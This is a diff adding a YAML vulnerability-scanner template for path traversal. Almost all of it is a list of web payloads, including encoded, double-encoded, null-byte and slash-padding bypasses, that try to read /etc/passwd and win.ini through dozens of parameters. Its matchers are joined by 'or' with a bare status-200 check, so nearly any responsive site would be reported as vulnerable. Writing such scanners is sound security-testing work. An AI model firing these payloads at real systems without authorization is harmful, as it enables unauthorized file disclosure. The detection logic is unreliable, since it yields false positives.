@@ -1,0 +1,103 @@
+id: path-traversal
+info:
+  name: Path Traversal Detection
+  author: pwn
+  severity: high
+  description: Detects path traversal vulnerabilities that may allow unauthorized access to sensitive files like /etc/passwd or win.ini.
+  tags: lfi, path-traversal, file-inclusion
+
+http:
+  - method: GET
+    path:
+      # Unix path traversal payloads
+      - "{{BaseURL}}/?file=../../../../../etc/passwd"
+      - "{{BaseURL}}/?filename=../../../../../etc/passwd"
+      - "{{BaseURL}}/?lang=../../../../../etc/passwd"
+      - "{{BaseURL}}/?page=../../../../../etc/passwd"
+      - "{{BaseURL}}/?view=../../../../../etc/passwd"
+      - "{{BaseURL}}/?path=../../../../../etc/passwd"
+      - "{{BaseURL}}/?dir=../../../../../etc/passwd"
+      - "{{BaseURL}}/?download=../../../../../etc/passwd"
+      - "{{BaseURL}}/?read=../../../../../etc/passwd"
+      - "{{BaseURL}}/?src=../../../../../etc/passwd"
+      - "{{BaseURL}}/?import=../../../../../etc/passwd"
+      - "{{BaseURL}}/?include=../../../../../etc/passwd"
+      - "{{BaseURL}}/?template=../../../../../etc/passwd"
+      - "{{BaseURL}}/?layout=../../../../../etc/passwd"
+      - "{{BaseURL}}/?config=../../../../../etc/passwd"
+      - "{{BaseURL}}/?load=../../../../../etc/passwd"
+      - "{{BaseURL}}/?show=../../../../../etc/passwd"
+      - "{{BaseURL}}/?root=../../../../../etc/passwd"
+      - "{{BaseURL}}/?doc=../../../../../etc/passwd"
+      - "{{BaseURL}}/?document=../../../../../etc/passwd"
+      # Encoded path traversal
+      - "{{BaseURL}}/?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+      - "{{BaseURL}}/?file=....//....//....//....//....//etc/passwd"
+      - "{{BaseURL}}/?file=..////..////..////..////..////etc/passwd"
+      - "{{BaseURL}}/?file=/%%5c../%%5c../%%5c../%%5c../%%5c../etc/passwd"
+      # Deep traversal
+      - "{{BaseURL}}/?file=../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/?file=/../../../../../../../../../../../../etc/passwd%00"
+      # Windows path traversal payloads
+      - "{{BaseURL}}/?file=..\\..\\..\\..\\..\\c:\\\\WINDOWS\\\\win.ini"
+      - "{{BaseURL}}/?file=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\\\win.ini"
+      - "{{BaseURL}}/?file=..\\\\..\\\\..\\\\..\\\\..\\\\c:\\\\WINDOWS\\\\win.ini"
+      - "{{BaseURL}}/?file=..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini"
+      - "{{BaseURL}}/?file=../../../../../../../../../../../../windows/win.ini"
+      # Additional common parameters with traversal
+      - "{{BaseURL}}/index.php?file=../../../../../etc/passwd"
+      - "{{BaseURL}}/view.php?file=../../../../../etc/passwd"
+      - "{{BaseURL}}/download.php?file=../../../../../etc/passwd"
+      - "{{BaseURL}}/read.php?file=../../../../../etc/passwd"
+      - "{{BaseURL}}/include.php?file=../../../../../etc/passwd"
+      - "{{BaseURL}}/main.php?file=../../../../../etc/passwd"
+      - "{{BaseURL}}/home.php?file=../../../../../etc/passwd"
+      - "{{BaseURL}}/content.php?file=../../../../../etc/passwd"
+      - "{{BaseURL}}/page.php?file=../../../../../etc/passwd"
+      - "{{BaseURL}}/test.php?file=../../../../../etc/passwd"
+      # Multiple slashes traversal
+      - "{{BaseURL}}/?file=/////../../../../../etc/passwd"
+      - "{{BaseURL}}/?file=//////////../../../../../etc/passwd"
+      - "{{BaseURL}}/?file=/..\\../..\\../..\\../..\\../etc/passwd"
+      # Null byte injection
+      - "{{BaseURL}}/?file=../../../../../etc/passwd%00"
+      - "{{BaseURL}}/?file=../../../../../etc/passwd%00.html"
+      # Double encoding
+      - "{{BaseURL}}/?file=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+      # Bypass techniques
+      - "{{BaseURL}}/?file=....//....//....//....//....//....//etc/passwd"
+      - "{{BaseURL}}/?file=..///////..////..//////etc/passwd"
+      - "{{BaseURL}}/?file=..\\..\\..\\..\\..\\etc/passwd"
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        name: unix-passwd
+        regex:
+          - "root:[x*]:0:0:"
+          - "daemon:[x*]:1:1:"
+        part: body
+      - type: regex
+        name: windows-winini
+        regex:
+          - "\\[fonts\\]"
+          - "\\[extensions\\]"
+          - "\\[mci extensions\\]"
+        part: body
+      - type: word
+        words:
+          - "bin/bash"
+          - "/root:/"
+          - "[boot loader]"
+          - "systemroot"
+        part: body
+        case-insensitive: true
+    extractors:
+      - type: regex
+        name: matched_path
+        part: request
+        regex:
+          - "https?://[^/]+(/.*)"
+        group: 1
